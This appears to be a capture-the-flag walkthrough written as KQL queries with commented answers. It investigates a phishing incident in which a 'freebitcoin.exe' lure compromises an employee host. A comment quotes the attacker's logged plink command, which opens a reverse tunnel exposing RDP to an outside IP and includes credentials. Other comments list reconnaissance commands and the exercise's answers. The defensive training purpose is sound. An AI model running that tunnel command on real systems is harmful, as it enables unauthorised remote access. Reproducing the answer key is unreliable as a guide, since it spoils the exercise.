@@ -1,0 +1,143 @@
+// Domination Nation
+
+/////////////////// Section 1: KQL 101 ///////////////////
+//////////////////////////////////////////////////////////
+
+// Q2 - How many employees are in the company?
+Employees
+| count 
+
+
+// Q3 - Each employee at WDN Consulting is assigned an IP address. Which employee has the IP address: “10.10.0.40”?
+Employees
+| where ip_addr == "10.10.0.40"
+// Accidently click the skip button . sigh...
+// Tanisha ODonoghue 
+
+// Q4 - How many emails did Gloria Gould receive?
+let gloria_email = 
+Employees
+| where name == "Gloria Gould"
+| distinct email_addr;
+Email
+| where recipient in (gloria_email)
+| count
+
+// Q5 - How many distinct senders were seen in the email logs from kayseeseven.com?
+Email
+| where sender contains "kayseeseven.com"
+| distinct sender
+| count 
+
+// Q6 - How many unique websites did “Judith Sower” visit?
+let js_ip = 
+Employees
+| where name == "Judith Sower"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (js_ip)
+| distinct url
+| count
+
+// Q7 - How many domains in the PassiveDns records contain the word “crypto”?
+PassiveDns
+| where domain contains "crypto"
+| distinct domain
+| count 
+
+// Q8 - What IPs did the domain “cryptocoin.net” resolve to (enter any one of them)?
+PassiveDns
+| where domain contains "cryptocoin.net"
+| distinct  ip
+// 22.160.111.66 - 193.46.203.153 - 218.51.95.7
+
+// Q9 - How many unique URLs were browsed by employees named “Karen”?
+let karens_ips =
+Employees
+| where name has "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (karens_ips)
+| distinct url
+| count 
+
+
+/////////////////// Section 2: Something Phishy ///////////////////
+///////////////////////////////////////////////////////////////////
+
+// Q1 - You notice that several security alerts were generated for a file named freebitcoin.exe. How many of these alerts were reported?
+SecurityAlerts
+| where  description contains "freebitcoin.exe"
+
+// Q2 - When was the first alert reported?
+// Same query as Q1
+// 2023-06-05T13:16:37Z
+
+// Q3 - Which host was this first alert associated with?
+// Smae query 
+// A suspicious file was detected on host QU09-DESKTOP. Filename: freebitcoin.exe. Sha256: 0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b
+// QU09-DESKTOP
+
+// Q4 - Which employee does this host belong to?
+Employees
+| where hostname == "QU09-DESKTOP"
+// James Reinhart - 10.10.4.70 - james_reinhart@wdnconsulting.com - jareinhart
+
+// Q5 - Check the host for processes created around the time the alert was reported. One of these processes involves the system registry. What is this command?
+ProcessEvents
+| where hostname == "QU09-DESKTOP"
+// ans: reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s - 2023-06-05T11:53:37Z
+// Interesting: "powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 81.192.242.254 -P 22 -l bitcoinminer -pw Crypto$123 -no-antispoof
+
+// Q6 - This command (the one from Q5) is used to get information about all the __ that has been installed using Windows Installer on the system.
+// programs
+
+// Q7 - A few minutes after this command was run, ipconfig was used to retrieve information about the network configuration of the system. What parameter/switch was used with ipconfig? 
+// /all
+
+// Q8 - Several other commands were run on this host around the time freebitcoin.exe appeared, including: whoami, net use, systeminfo, and arp -a.
+// These commands likely represent what MITRE ATT&CK tactic?
+// Discovery (TA0007)
+
+// Q9 - The adversary may have used a tool to establish a tunnel to remote infrastructure. What is the name of the tool used on this host to establish a tunnel?
+// plink
+// I saw it earliert
+
+// Q10 - What IP address did this tool connect to?
+// 81.192.242.254
+// see Q5
+
+// Q11 - What password was used to establish the tunnel?
+// Crypto$123
+
+// Q12 - What was the name of the file created on this host shortly before freebitcoin.exe was created?
+FileCreationEvents
+| where hostname == "QU09-DESKTOP"
+| where filename contains "free"
+// 2023-06-05T13:10:22Z
+
+FileCreationEvents
+| where hostname == "QU09-DESKTOP"
+// ans: HaveYouHeardAboutDogeCoin.docx
+// Interesting GIVE_US_YOUR_BITCOIN.txt
+
+// Q13 - What is the SHA256 hash of this file?
+// a8145d4fd1534976e060cf8d0e4e206cda61d53f3d3c7f8bb29874532fef8d72
+
+// Q14 - Wht is the name of the process that created this file?
+// edge.exe
+
+// Q15 - Hmmm. If an internet browser created the file maybe it was downloaded from somewhere. Check the browsing logs. What URL did this employee click to download the file?
+OutboundNetworkEvents
+| where src_ip == "10.10.4.70"
+| where url contains ".docx"
+// http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx - 2023-06-05T13:09:30Z
+
+// Q16 - Maybe the user clicked on this link because it was sent to them in an email. What email address was used to send this link to the user?
+Email
+| where link has "http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx"
+// freedom@hotmail.com
+
+// Q17 - 
+// [EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.
+
